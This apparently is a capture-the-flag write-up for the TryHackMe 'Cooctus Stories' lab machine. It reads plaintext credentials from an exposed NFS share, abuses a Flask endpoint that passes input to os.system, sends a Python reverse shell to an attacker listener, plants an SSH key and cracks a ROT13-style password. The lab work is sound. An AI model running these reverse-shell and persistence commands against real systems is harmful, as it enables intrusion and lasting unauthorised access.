# Cooctus Stories — Writeup

## Overview
### Cooctus Stories — Writeup
### Cooctus Stories — Writeup
----
This room is about the Cooctus Clan
----
![](https://pbs.twimg.com/profile_banners/1696074763/1605441583/1500x500)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/ceced121b72bb2fdd04bfc59fcbc2dce.png)
Start Machine
**Previously on Cooctus Tracker**
_Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened. (From [Overpass 2 - Hacked](https://tryhackme.com/room/overpass2hacked) by [NinjaJc01](https://tryhackme.com/p/NinjaJc01))_
**Present times**
Further investigation revealed that the hack was made possible by the help of an insider threat. Paradox helped the Cooctus Clan hack overpass in exchange for the secret shiba stash. Now, we have discovered a private server deep down under the boiling hot sands of the Saharan Desert. We suspect it is operated by the Clan and it's your objective to uncover their plans.
**Note:** A stable shell is recommended, so try and SSH into users when possible.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.205.66 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.205.66:22
Open 10.10.205.66:111
Open 10.10.205.66:2049
Open 10.10.205.66:8080
Open 10.10.205.66:35963
Open 10.10.205.66:37837
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.205.66 [6 ports]
Discovered open port 8080/tcp on 10.10.205.66
Discovered open port 111/tcp on 10.10.205.66
Discovered open port 22/tcp on 10.10.205.66
Discovered open port 37837/tcp on 10.10.205.66
Discovered open port 2049/tcp on 10.10.205.66
Discovered open port 35963/tcp on 10.10.205.66
Completed Connect Scan (6 total ports)
Initiating Service scan
Scanning 6 services on 10.10.205.66
Completed Service scan (6 services on 1 host)
NSE: Script scanning 10.10.205.66.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.205.66
Host is up, received user-set (0.18s latency).

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e54462919008995de8554f69ca021c10 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbRN8GvRSpA+ku5hqrPnyaobOvwYc4jddRGBHo91dNlIjNdX4LIRLCLdJkpMlW64MVwHV8QIjTFNxPqLQvOkbIn3yX+MQByFziSNf7h5+/tqrXDwZDMMqFAmZ7yeXoopcRY1cfumkYUHbjRxdrNj8Hpd8ol6xnIo9y+qiZx1HPpY3P9HsRpZ6XBq0bE3J68gBozFQmXa8gIU5aX+l0PHOdctWRo4vXa/oQteObsn9Rx+69WpatoDx1TdP4T3fGa3f1dMFIohCzlTUPJgzyGuRZq6JjaBvItUIGPg+isvkg7+diSLDCIo/U7vixeJNLrnvETMnRlwn0jOKxUFrtIwB7
|   256 e5a7b01452e1c94e0db81adbc5d67ef0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNz3AD3vWNpd2P1sXPm9tHrr6RQjBiCsXT0U/6euW2oK1RqQvipuiKTlcpNRRsXOxcIpscn+7M3nwW5Cgq0ipiA=
|   256 029718d6cd3258175043ddd22fba1553 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAv5Jlh5/zgLa5D73WCXKa44htAWA67kUp4x5pGWgXri
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33588/udp6  mountd
|   100005  1,2,3      46596/udp   mountd
|   100005  1,2,3      50235/tcp   mountd
|   100005  1,2,3      60881/tcp6  mountd
|   100021  1,3,4      34461/udp6  nlockmgr
|   100021  1,3,4      35963/tcp   nlockmgr
|   100021  1,3,4      37256/udp   nlockmgr
|   100021  1,3,4      44709/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack 3 (RPC #100227)
8080/tcp  open  http     syn-ack Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: CCHQ
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
35963/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
37837/tcp open  mountd   syn-ack 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.09 seconds

                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.205.66:8080/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.205.66:8080/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.205.66:8080/cat                  (Status: 302) [Size: 219] [--> http://10.10.205.66:8080/login]
http://10.10.205.66:8080/login                (Status: 200) [Size: 556]
Progress: 4614 / 4615 (99.98%)
===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ showmount -e 10.10.205.66 
Export list for 10.10.205.66:
/var/nfs/general *
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mkdir /mnt/cat-nfs 
[sudo] password for witty: 
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mount 10.10.205.66:/var/nfs/general /mnt/cat-nfs 

┌──(witty㉿kali)-[~/Downloads]
└─$ cd /mnt/cat-nfs         
                                                                                  
┌──(witty㉿kali)-[/mnt/cat-nfs]
└─$ ls
credentials.bak
                                                                                  
┌──(witty㉿kali)-[/mnt/cat-nfs]
└─$ cat credentials.bak                 
paradoxial.test
ShibaPretzel79

login in port 8080

- `-c`: This option tells `rlwrap` to clear the screen after each command is executed. It helps keep the terminal clean and provides a fresh view for each new command.
    
- `-A`: It enables automatic line-wrapping. This means that when you reach the end of a line and continue typing, the text will automatically wrap to the next line instead of creating a horizontal scrollbar.
    
- `-r`: This option enables recursive history search. It allows you to search through your command history using Ctrl+R, allowing you to quickly find and reuse previous commands.

http://10.10.205.66:8080/cat

Welcome Cooctus Recruit!

Here, you can test your exploits in a safe environment before launching them against your target. Please bear in mind, some functionality is still under development in the current version.

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

┌──(witty㉿kali)-[/mnt/cat-nfs]
└─$ rlwrap -cAr nc -lvnp 4444                                
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.205.66] 60968
paradox@cchq:~$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
paradox@cchq:~$ ls
ls
CATapp  user.txt
paradox@cchq:~$ cat user.txt
cat user.txt
THM{2dccd1ab3e03990aea77359831c85ca2}

paradox@cchq:~/CATapp$ cat app.py
cat app.py
#!/usr/bin/python3

from flask import Flask, render_template, redirect, url_for, request
import os
import shlex
import subprocess

app = Flask(__name__)

global logged_in
logged_in = False

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=['GET', 'POST'])
def login():
    global logged_in
    error = None
    if request.method == "POST":
        if request.form['username'] != 'paradoxial.test' or request.form['password'] != 'ShibaPretzel79':
            error = 'No enter for you >:('
        else:
            logged_in = True
            return redirect(url_for('cat'))
    
    return render_template("login.html", error = error)

@app.route("/cat", methods=['GET', 'POST'])
def cat():
    global logged_in
    if not logged_in:
        return redirect(url_for("login"))
    error = None
    if request.method == "POST":
        payload = request.form['payload']
        os.system(payload)
        #return request.form['payload']
        return payload
    return render_template("cat.html", error=error)

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=8080)

paradox@cchq:~$ mkdir .ssh
mkdir .ssh
paradox@cchq:~$ cd .ssh
cd .ssh
paradox@cchq:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vZarFqiXyoMZ/+B9S5jcOMRIOwWMyTvWUIWwsTc2WlDBgRPRA4dnEtvHzN+WLEE0mLsatYqipe5ULuZ6EbKE1vD5lx5BO+zrEQafs5JcJ5Th0noVivP9BS3E5EuccqMOPUBKZ6YQA9Yc5jLMz2MzaRpUQSy7QojdLziXU1s0cl6TbVQbNypj4JJcmz76TxhN/gR+FXUR+YTdtb08/IJx3eOq5b0lZthBbeDXszcQKl4fwP1/MBvmmEgD2ByvdUk+kckOJsi2IEiJjm7AIFK8s2/MW2cl/t1+qDS+c/HMEQf4lum4sMEcMP7WKZ9XLHL4DPsrwCrUsK/qntuP+lvormUn9otLc0yirRpawpdBocxOpxNZKp7FL3xr47yN3A406CaLXgMYSqP2WQrumH0VsfRMp+oSxYCRC9HzFoRto7qXw3rWozLgq0RicWzdOhD59Ooc4ZA5Kro46ftMD8oCOzUDzK/lKmhnHN3Kuiz6bklOMx4qtfu28PozrFPq348= witty@kali" > authorized_keys 
<Mx4qtfu28PozrFPq348= witty@kali" > authorized_keys 

┌──(witty㉿kali)-[~/Downloads]
└─$ cd seasurfer  
                                                                                   
┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ ls
id_rsa  id_rsa.pub
                                                                                   
┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ ssh -i id_rsa paradox@10.10.205.66
The authenticity of host '10.10.205.66 (10.10.205.66)' can't be established.
ED25519 key fingerprint is SHA256:dNmGI1/f4OIRxWe6Ni/JzXxVz7QOMEGVvRTBj7LNbyQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.205.66' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 16 19:39:35 UTC 2023

  System load:  0.0                Processes:           111
  Usage of /:   35.0% of 18.57GB   Users logged in:     0
  Memory usage: 37%                IP address for eth0: 10.10.205.66
  Swap usage:   0%

0 packages can be updated.
0 of these updates are security updates.

Last login: Sat Feb 20 21:17:46 2021 from 172.16.228.162
paradox@cchq:~$ id
uid=1003(paradox) gid=1003(paradox) groups=1003(paradox)

Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 19:40:01 2023):     
                                                                               
Approximate location of an upcoming Dr.Pepper shipment found:
                                                                               
                                                                               
Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 19:40:01 2023):     
                                                                               
Coordinates: X: 507, Y: 115, Z: 841

paradox@cchq:/home/szymex$ cat note_to_para 
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex
paradox@cchq:/home/szymex$ cat SniffingCat.py 
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc

x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)

paradox@cchq:/home/szymex$ cat mysupersecretpassword.cat
cat: mysupersecretpassword.cat: Permission denied
paradox@cchq:/home/szymex$ ls -lah
total 44K
drwxr-xr-x 5 szymex szymex 4.0K Feb 22  2021 .
drwxr-xr-x 6 root   root   4.0K Jan  2  2021 ..
lrwxrwxrwx 1 szymex szymex    9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 szymex szymex  220 Jan  2  2021 .bash_logout
-rw-r--r-- 1 szymex szymex 3.8K Feb 20  2021 .bashrc
drwx------ 2 szymex szymex 4.0K Jan  2  2021 .cache
drwx------ 3 szymex szymex 4.0K Jan  2  2021 .gnupg
drwxrwxr-x 3 szymex szymex 4.0K Jan  2  2021 .local
-r-------- 1 szymex szymex   11 Jan  2  2021 mysupersecretpassword.cat
-rw-rw-r-- 1 szymex szymex  316 Feb 20  2021 note_to_para
-rwxrwxr-- 1 szymex szymex  735 Feb 20  2021 SniffingCat.py
-rw------- 1 szymex szymex   38 Feb 22  2021 user.txt

paradox@cchq:/home/szymex$ cat /etc/crontab
```
```text
# /etc/crontab: system-wide crontab
```
```text
# Unlike any other crontab you don't have to run the `crontab'
```
```text
# command to install the new version when you edit this file
```
```text
# and files in /etc/cron.d. These files also have username fields,
```
```text
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

## Privilege Escalation
```text
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * 	* * * 	szymex	/home/szymex/SniffingCat.py

paradox@cchq:/home/szymex$ python SniffingCat.py 
Traceback (most recent call last):
  File "SniffingCat.py", line 23, in <module>
    with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
IOError: [Errno 13] Permission denied: '/home/szymex/mysupersecretpassword.cat'

┌──(witty㉿kali)-[~/Downloads]
└─$ cat test_cat.py 
#!/usr/bin/python3

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc

s = 'abcdefghijklmnopqrstuvwxyz'
clear = list(s)
encoded = list(encode(s))

pwd = "pureelpbxr"
dec = ""

for i in pwd:
    dec += clear[encoded.index(i)]

print(dec)
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 test_cat.py 
cherrycoke

paradox@cchq:/home/szymex$ su szymex
Password: 
szymex@cchq:~$ cd /home/szymex/
szymex@cchq:~$ ls
mysupersecretpassword.cat  note_to_para  SniffingCat.py  user.txt
szymex@cchq:~$ cat user.txt 
THM{c89f9f4ef264e22001f9a9c3d72992ef}

szymex@cchq:/home$ cd tux/
szymex@cchq:/home/tux$ ls
note_to_every_cooctus  tuxling_1  user.txt
szymex@cchq:/home/tux$ cat note_to_every_cooctus 
Hello fellow Cooctus Clan members

I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.

The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
explore the world while making sure our control over every continent spreads accordingly.

Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
Work on the challenges is already underway thanks to the trio of my top-most explorers.

Required budget: 2,348,123 Doge coins and 47 pennies.

Hope this message finds all of you well and spiky.

- TuxTheXplorer

szymex@cchq:/home/tux$ cd tuxling_1
szymex@cchq:/home/tux/tuxling_1$ ls
nootcode.c  note
szymex@cchq:/home/tux/tuxling_1$ cat note
Noot noot! You found me. 
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!
